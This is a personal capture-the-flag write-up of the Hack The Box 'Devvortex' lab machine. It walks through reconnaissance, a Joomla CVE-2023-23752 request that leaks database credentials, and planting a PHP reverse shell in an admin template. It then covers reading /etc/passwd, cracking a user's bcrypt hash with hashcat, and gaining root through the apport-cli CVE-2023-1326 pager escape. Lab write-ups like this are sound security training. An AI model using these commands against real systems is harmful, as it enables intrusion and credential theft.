+++
title = 'Devvortex'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan:
```
└─$ nmap 10.129.229.146 -p- -vv -sC -T4 -Pn --min-rate=1000
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 21:03 AWST
NSE: Loaded 126 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:03
Completed NSE at 21:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:03
Completed NSE at 21:03, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:03
Completed Parallel DNS resolution of 1 host. at 21:03, 0.02s elapsed
Initiating SYN Stealth Scan at 21:03
Scanning 10.129.229.146 [65535 ports]
Discovered open port 80/tcp on 10.129.229.146
Discovered open port 22/tcp on 10.129.229.146
SYN Stealth Scan Timing: About 44.71% done; ETC: 21:04 (0:00:38 remaining)
Completed SYN Stealth Scan at 21:04, 68.01s elapsed (65535 total ports)
NSE: Script scanning 10.129.229.146.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 22.49s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
Nmap scan report for 10.129.229.146
Host is up, received user-set (0.38s latency).
Scanned at 2025-08-20 21:03:13 AWST for 91s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63
|_http-title: Did not follow redirect to http://devvortex.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 90.77 seconds
           Raw packets sent: 67303 (2.961MB) | Rcvd: 67306 (2.692MB)

```

ports 80 and 22 (http and ssh)
tries to redirect to http://devvortex.htb/ - change /etc/hosts

explored - not too much to interact with
![Devvortex (Easy Linux).png](Devvortex%20%28Easy%20Linux%29.png)
there is a couple of inputs for email and name to get a "call back" - seems to not have injection

/images/xxx.png - a few images exist like this in the source html - dont think this is a vuln?

running out of ideas - time to fuzz

while fuzz running - check versions for ssh:
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
OpenSSH 8.2p1 does seem vulnerable
![Devvortex (Easy Linux)-1.png](Devvortex%20%28Easy%20Linux%29-1.png)
![Devvortex (Easy Linux)-2.png](Devvortex%20%28Easy%20Linux%29-2.png)
Not vulnerable to Terrapin

looked at other things - lost - did a couple of questions on the guided mode of hackthebox - I FORGOT TO FUZZ SUBDOMAINS 

thats it for today im tired as shit, pick it up tomorrow - next step is fuzz for subdomains

![Devvortex (Easy Linux)-3.png](Devvortex%20%28Easy%20Linux%29-3.png)

fuzzed and found dev.devvortex.htb

based on http response, it seems the website is using cassiopeia CMS

![Devvortex (Easy Linux)-4.png](Devvortex%20%28Easy%20Linux%29-4.png)
interesting page?
can see /index.php - so php server

can see the website is using joomla
searching for joomla vulnerabilities - Joomla! version 4 exposes version information in the /language/en-GB/langmetadata.xml
![Devvortex (Easy Linux)-5.png](Devvortex%20%28Easy%20Linux%29-5.png)
potential exploits
![Devvortex (Easy Linux)-6.png](Devvortex%20%28Easy%20Linux%29-6.png)
![Devvortex (Easy Linux)-7.png](Devvortex%20%28Easy%20Linux%29-7.png)
login page exposed

searching "joomla 4.2.6 administrator login vulnerability
https://www.vulncheck.com/blog/joomla-for-rce

CVE-2023-23752
run `curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`

provides:
![Devvortex (Easy Linux)-8.png](Devvortex%20%28Easy%20Linux%29-8.png)
user: lewis
password: P4ntherg0t1n5r3c0n##

login to admin portal Joomla!

following the website for code execution - navigate to system -> administrator templates -> atum details and files

![Devvortex (Easy Linux)-9.png](Devvortex%20%28Easy%20Linux%29-9.png)

add simple line to index.php to get command execution

stole php reverse shell off https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![Devvortex (Easy Linux)-10.png](Devvortex%20%28Easy%20Linux%29-10.png)

as www-data
```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
logan:x:1000:1000:,,,:/home/logan:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

got the reverse shell - now have to priv esc -
attack path -> look for logan's password somewhere on the box
	run linpeas -> perform find commands in suspicious locations

using `ss -tuln` and `ss -tulp` we can see that mysql is running on the box and using lewis's creds, we can login
![Devvortex (Easy Linux)-11.png](Devvortex%20%28Easy%20Linux%29-11.png)

```
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMNS_EXTENSIONS                    |
| COLUMN_PRIVILEGES                     |
| COLUMN_STATISTICS                     |
| ENABLED_ROLES                         |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CACHED_INDEXES                 |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_COLUMNS                        |
| INNODB_DATAFILES                      |
| INNODB_FIELDS                         |
| INNODB_FOREIGN                        |
| INNODB_FOREIGN_COLS                   |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_INDEXES                        |
| INNODB_METRICS                        |
| INNODB_SESSION_TEMP_TABLESPACES       |
| INNODB_TABLES                         |
| INNODB_TABLESPACES                    |
| INNODB_TABLESPACES_BRIEF              |
| INNODB_TABLESTATS                     |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_TRX                            |
| INNODB_VIRTUAL                        |
| KEYWORDS                              |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| RESOURCE_GROUPS                       |
| ROLE_COLUMN_GRANTS                    |
| ROLE_ROUTINE_GRANTS                   |
| ROLE_TABLE_GRANTS                     |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMATA_EXTENSIONS                   |
| SCHEMA_PRIVILEGES                     |
| STATISTICS                            |
| ST_GEOMETRY_COLUMNS                   |
| ST_SPATIAL_REFERENCE_SYSTEMS          |
| ST_UNITS_OF_MEASURE                   |
| TABLES                                |
| TABLESPACES                           |
| TABLESPACES_EXTENSIONS                |
| TABLES_EXTENSIONS                     |
| TABLE_CONSTRAINTS                     |
| TABLE_CONSTRAINTS_EXTENSIONS          |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_ATTRIBUTES                       |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| VIEW_ROUTINE_USAGE                    |
| VIEW_TABLE_USAG
```
```
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+

```
![Devvortex (Easy Linux)-12.png](Devvortex%20%28Easy%20Linux%29-12.png)
logan@devvortex.htb
`$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

cracked! -> password for logan is tequieromucho

logan@devvortex.htb tequieromucho

Try ssh in as logan - user pwned!

![Devvortex (Easy Linux)-13.png](Devvortex%20%28Easy%20Linux%29-13.png)

we can run appport-cli as root, apport-cli is version 2.20.11
searching this up, there is CVE-2023-1326 which leads to privilege escalation

Using the help page, running 
`/usr/bin/apport-cli -P 0 -f --save=/home/logan/a.crash`
 creates a valid crash file which we can then do
 `sudo /usr/bin/apport-cli -c a.crash`
and then view which puts us in a `less` view of the report which we can exit using `!/bin/bash` giving us root
